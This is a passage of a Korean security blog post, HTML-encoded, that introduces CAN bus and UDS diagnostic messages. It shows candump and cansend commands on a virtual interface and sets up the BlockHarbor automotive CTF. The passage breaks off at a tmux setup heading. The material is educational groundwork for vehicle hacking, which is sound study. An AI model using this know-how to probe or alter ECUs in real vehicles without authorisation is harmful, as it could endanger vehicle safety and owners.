      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>&#xCC28;&#xB7C9; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xBD84;&#xC57C;&#xAC00; &#xBC14;&#xB85C; CAN &#xD1B5;&#xC2E0;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; CAN &#xD1B5;&#xC2E0;&#xC5D0;&#xC11C;&#xB3C4; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;! &#xC774; &#xCC28;&#xB7C9; &#xBD84;&#xC57C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CTF&#xC640; &#xB300;&#xD68C;&#xB4E4; &#xB610;&#xD55C; &#xB9CE;&#xC774; &#xAC1C;&#xCD5C;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(Defcon&#xC5D0;&#xC11C;&#xB3C4; car hacking village&#xAC00; &#xC788;&#xC8E0;).</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xCC28;&#xB7C9; &#xD574;&#xD0B9; CTF&#xB85C; &#xAC00;&#xC7A5; &#xC720;&#xBA85;&#xD55C; CTF &#xC911; &#xD558;&#xB098;&#xC778; BlockHarbor CTF &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xCC28;&#xB7C9; &#xD1B5;&#xC2E0;&#xACFC; &#xC774;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-CAN-Bus-amp-UDS"><a href="#1-CAN-Bus-amp-UDS" class="headerlink" title="1. CAN Bus &amp; UDS"></a>1. CAN Bus &amp; UDS</h2><p><img src="image02.png" alt="[image02.png](https://t-shaped-person.tistory.com/51)"></p><p>CAN &#xD1B5;&#xC2E0;&#xC740; &#xCC28;&#xB7C9; &#xB0B4;&#xC758; ECU(&#xC804;&#xC790; &#xC81C;&#xC5B4; &#xC7A5;&#xCE58;) &#xAC19;&#xC740; &#xC7A5;&#xCE58;&#xB4E4; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC704;&#xD574; &#xAC1C;&#xBC1C;&#xB41C; &#xD1B5;&#xC2E0; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. Non-host &#xBC84;&#xC2A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0; &#xAE30;&#xBC18;&#xC758; &#xC800;&#xC218;&#xC900; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. 1983&#xB144;&#xC5D0; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; HTTP&#xBCF4;&#xB2E4; &#xBA3C;&#xC800; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;! CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; 8 Byte&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xACE0;, &#xC774;&#xB97C; &#xD655;&#xC7A5;&#xD55C; CAN-FD&#xB294; 64 Byte&#xAE4C;&#xC9C0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ISO 15765&#xC5D0; &#xC758;&#xD574; CAN &#xD1B5;&#xC2E0; &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xAD6D;&#xC81C; &#xD45C;&#xC900;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image03.png" alt="[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)"></p><p>UDS&#xB294; &#xD1B5;&#xD569; &#xC9C4;&#xB2E8; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC758;&#xBBF8;&#xD558;&#xBA70;, &#xCC28;&#xB7C9; CTF&#xC640; CAN &#xD1B5;&#xC2E0;&#xC744; &#xC811;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; UDS&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xB97C; &#xC790;&#xC8FC; &#xB9C8;&#xC8FC;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; ECU&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC9C4;&#xB2E8; &#xD1B5;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xC218;&#xC900;&#xC758; CAN &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBCF4;&#xB2E4; &#xACE0;&#xC218;&#xC900;&#xC758; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB370;&#xC774;&#xD130; R/W &#xAC19;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, CAN &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, CAN &#xBA54;&#xC2DC;&#xC9C0;&#xC640; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xCC28;&#xB7C9; &#xC9C4;&#xB2E8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; OBD2 &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xD63C;&#xC7AC; &#xB418;&#xC5B4; &#xC6A9;&#xC5B4; &#xC124;&#xBA85;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. ISO 14229&#xB85C; UDS&#xC5D0; &#xB300;&#xD55C; &#xD45C;&#xC900;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88;&#xC5D0; &#xD480; BlockHarbor CTF&#xC5D0;&#xC11C;&#xB294; UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xB97C; &#xC544;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xAD6C;&#xC131;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC911;&#xC5D0;&#xC11C; &#xAC01; &#xBD80;&#xBD84;&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC124;&#xBA85;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CAN ID: &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0; &#xD560; ECU</li><li>PCI: &#xC8FC;&#xB85C; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xAE38;&#xC774;, Flow Control &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;</li><li>SID: &#xC11C;&#xBE44;&#xC2A4; &#xC2DD;&#xBCC4;&#xC790;<ul><li>Sub Function Byte: SID&#xC5D0; &#xC138;&#xBD80;&#xC801;&#xC778; &#xC635;&#xC158;</li></ul></li><li>DID: &#xB370;&#xC774;&#xD130; &#xC2DD;&#xBCC4;&#xC790;</li></ul><p>&#xC774;&#xC911; &#xC911;&#xC694;&#xD55C; &#xBA87; &#xAC00;&#xC9C0; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image04.png" alt="image04.png"></p><p>CAN ID&#xB294; ISO 15765-4&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xAC01; ECU&#xC5D0; &#xB300;&#xD55C; CAN ID &#xAC12;&#xC774; 16&#xC9C4;&#xC218;&#xB85C; &#xC815;&#xD574;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>7DF</code>&#xC758; &#xACBD;&#xC6B0; &#xC8FC;&#xB85C; &#xBAA8;&#xB4E0; ECU&#xC5D0; &#xB300;&#xD55C; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xB610;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xC774;&#xB098; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574; ECU&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xC2DD;&#xBCC4;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC1A1;&#xC2E0;&#xC758; &#xACBD;&#xC6B0; 1&#xBC88; ECU&#xB294; <code>7E0</code>, 2&#xBC88; ECU&#xB294; <code>7E1</code>&#xC640; &#xAC19;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC218;&#xC2E0;&#xC758; &#xACBD;&#xC6B0;&#xB294; &#xC1A1;&#xC2E0; &#xAC12;&#xC758; <code>+0x8</code>&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC9C0;&#xC815; &#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>SID&#xB294; &#xC27D;&#xAC8C; &#xC774;&#xC57C;&#xAE30; &#xD574;&#xC11C; &#xC774;&#xB7F0; &#xD589;&#xC704;(&#xC11C;&#xBE44;&#xC2A4;)&#xB97C; &#xD560; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xC2DD;&#xBCC4;&#xC790; &#xC785;&#xB2C8;&#xB2E4;. SID &#xAC12;&#xC740; &#xC5ED;&#xC2DC; &#xD45C;&#xC900;&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC9C1;&#xC811; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">&#xBB38;&#xC11C;</a>&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; SID &#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD;&#xD560; &#xB54C; SID &#xAC12;&#xC5D0; <code>+0x40</code>&#xC758; &#xAC12;&#xC774; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC751;&#xB2F5; SID &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD; SID &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC751;&#xB2F5; &#xAC12;&#xC778; RSID&#xAC00; &#xC798; &#xC218;&#xC2E0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74;, &#xD1B5;&#xC2E0;&#xC774; &#xC798; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; SID &#xC911;&#xC5D0;&#xC11C; Sub Function Byte&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; SID &#xC694;&#xCCAD; &#xC2DC;, &#xBCF4;&#xB2E4; &#xC138;&#xBD80;&#xC801;&#xC778; &#xC11C;&#xBE44;&#xC2A4; &#xC694;&#xCCAD;&#xC744; &#xC9C0;&#xCE6D;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC0AC;&#xC6A9;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xC5C6;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBB38;&#xC11C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>DID&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC9C0;&#xCE6D;&#xD558;&#xB294; &#xC2DD;&#xBCC4;&#xC790; &#xC785;&#xB2C8;&#xB2E4;. DID &#xAC12;&#xB3C4; ISO-14229 &#xD45C;&#xC900;&#xC5D0; &#xB530;&#xB77C; &#xC608;&#xC57D;&#xB41C; &#xAC12;&#xC774; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">&#xBB38;&#xC11C;</a>&#xB97C; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xD574;&#xB2F9;&#xD558;&#xB294; DID &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xB300;&#xD45C;&#xC801;&#xC740; DID&#xC758; &#xC608;&#xC2DC;&#xB294; &#xBC14;&#xB85C; &#xCC28;&#xB300; &#xBC88;&#xD638;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; VIN &#xAC12;&#xC778; <code>F190</code>&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; DID &#xAC12;&#xC744; SID&#xC640; &#xD568;&#xAED8; &#xC694;&#xCCAD;&#xD558;&#xBA74;, SID &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; VIN&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBC29;&#xAE08; &#xC124;&#xBA85;&#xD55C; Sub Function Byte&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; SID&#xC758; &#xACBD;&#xC6B0; DID&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC73C;&#xB85C; &#xD480; BlockHarbor CTF &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">SID</a>&#xC640; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> &#xBB38;&#xC11C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC5F4;&#xC5B4; &#xB193;&#xACE0;, &#xADF8;&#xB54C;&#xB9C8;&#xB2E4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCC3E;&#xC544; &#xBB38;&#xC81C; &#xD480;&#xC774;&#xB97C; &#xD558;&#xB294; &#xAC83;&#xC774; &#xB9E4;&#xC6B0; &#xD544;&#xC218;&#xC801;&#xC785;&#xB2C8;&#xB2E4;!</p><h3 id="1-1-CAN-Utils"><a href="#1-1-CAN-Utils" class="headerlink" title="1.1. CAN Utils"></a>1.1. CAN Utils</h3><p><img src="image05.jpg" alt="image05.jpg"></p><p>CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; can-utils &#xB3C4;&#xAD6C;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB3C4;&#xAD6C;&#xB294; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; CAN &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xAD6C;&#xD604;&#xD55C; SocketCAN &#xAE30;&#xBC18;&#xC758; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xC544;&#xB798;&#xC758; &#xC608;&#xC81C;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">candump -a vcan0,7E0:7FF</code></pre><p>candump&#xB294; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xD558;&#xB294; CAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C;&#xB294; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; ASCII &#xACB0;&#xACFC;&#xB97C; &#xAC19;&#xC774; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; <code>-a</code> &#xC635;&#xC158;&#xACFC; ECU1&#xC5D0;&#xC11C;&#xB9CC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xB3C4;&#xB85D; <code>7E0</code> &#xBC0F; <code>7FF</code> &#xB9C8;&#xC2A4;&#xD0B9; &#xC778;&#xC790;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xD6C4; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C;&#xC5D0;&#xB294; &#xD55C; &#xCABD; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xC11C; &#xC751;&#xB2F5;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xC6A9;&#xB3C4;&#xB85C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>cansend&#xB294; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xB294; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC5ED;&#xC2DC; &#xC6D0;&#xD558;&#xB294; CAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC73C;&#xB85C; &#xD480; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC774;&#xC804;&#xC5D0; &#xC124;&#xBA85;&#xD55C; UDS &#xD3EC;&#xB9F7;&#xC5D0; &#xB9DE;&#xCDB0; SID, DID&#xB97C; &#xC798; &#xAD6C;&#xC131;&#xD558;&#xC5EC; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC751;&#xB2F5; &#xB370;&#xC774;&#xD130;&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC778; CAN &#xBA54;&#xC2DC;&#xC9C0; &#xAE38;&#xC774;&#xC778; 8 Byte &#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0;&#xB97C; &#xC704;&#xD574;, <code>30000000</code> &#xAC19;&#xC740; Flow Control &#xC694;&#xCCAD;&#xC744; &#xAC19;&#xC774; &#xBCF4;&#xB0B4;&#xC11C; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; cansend&#xB85C; &#xC804;&#xC1A1;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xC751;&#xB2F5;&#xC744;, candump&#xB85C; &#xD655;&#xC778;&#xD558;&#xBA70; CAN/UDS &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-Blockharbor-CTF"><a href="#2-Blockharbor-CTF" class="headerlink" title="2. Blockharbor CTF"></a>2. Blockharbor CTF</h2><p><img src="image06.jpg" alt="image06.jpg"></p><p>BlockHarbor CTF&#xB294; &#xC790;&#xB3D9;&#xCC28; &#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xD68C;&#xC0AC;&#xC778; Block Harbor&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; Automotive Capture the Flag(CTF) &#xB300;&#xD68C;&#xC785;&#xB2C8;&#xB2E4;. &#xAC00;&#xC0C1; CAN &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xD658;&#xACBD;&#xACFC; ECU &#xAC04;&#xC758; &#xD1B5;&#xC2E0; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD574; &#xB193;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; &#xB300;&#xD68C; &#xBB38;&#xC81C;&#xB97C; &#xD1B5;&#xD574; CAN/UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xC2B5;&#xC744; &#xD3B8;&#xB9AC;&#xD558;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC7A5;&#xC810;&#xC73C;&#xB85C; &#xCC28;&#xB7C9; &#xD574;&#xD0B9; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; &#xAC00;&#xC7A5; &#xCD94;&#xCC9C;&#xB418;&#xB294; &#xC0AC;&#xC774;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xD06C;&#xAC8C; 2&#xAC1C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. CTFd &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB41C; <a href="https://proving-grounds.blockharbor.io/">CTF &#xBB38;&#xC81C; &#xC0AC;&#xC774;&#xD2B8;</a>&#xC640;, &#xCC28;&#xB7C9; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xCD95;&#xD55C; <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a> &#xC0AC;&#xC774;&#xD2B8;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; CAN/UDS &#xBC0F; &#xCC28;&#xB7C9;&#xC5D0; &#xB300;&#xD574; &#xCC98;&#xC74C; &#xC811;&#xD55C;&#xB2E4;&#xBA74;, &#xBB38;&#xC81C; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; Getting Started &#xBB38;&#xC81C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image07.png" alt="image07.png"></p><p><a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a>&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; Other - Learn - SIMULATIONS&#xC5D0;&#xC11C; Proving Grounds&#xC758; &#xC6B0;&#xCE21; &#xD130;&#xBBF8;&#xB110; &#xC544;&#xC774;&#xCF58;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xBA74;, &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xCC28;&#xB7C9; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xC6F9;&#xC73C;&#xB85C; &#xC811;&#xC18D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xC774;&#xC911;&#xC5D0;&#xC11C; UDS Challenge &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, UDS Challenge&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xC811;&#xC18D;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xBB38;&#xC81C;&#xB97C; &#xD47C;&#xB2E4;&#xBA74;, &#xB2E4;&#xB978; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xC5EC; &#xBB38;&#xC81C;&#xC5D0; &#xC54C;&#xB9DE;&#xC740; &#xD658;&#xACBD;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image08.png" alt="image08.png"></p><p>&#xD130;&#xBBF8;&#xB110; &#xC544;&#xC774;&#xCF58;&#xC744; &#xD1B5;&#xD574; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xC704;&#xCC98;&#xB7FC; tmux &#xC258;&#xB85C; &#xC811;&#xC18D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD655;&#xC778;&#xD55C; CTF &#xBB38;&#xC81C;&#xB97C; &#xC774; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD480;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-1-tmux-&#xC124;&#xC815;"><a href="#2-1-tmux-&#xC124;&#xC815;" class="headerlink" title="2.1 tmux &#xC124;&#xC815;"></a>2.1 tmux &#xC124;&#xC815;</h3><p>tmux 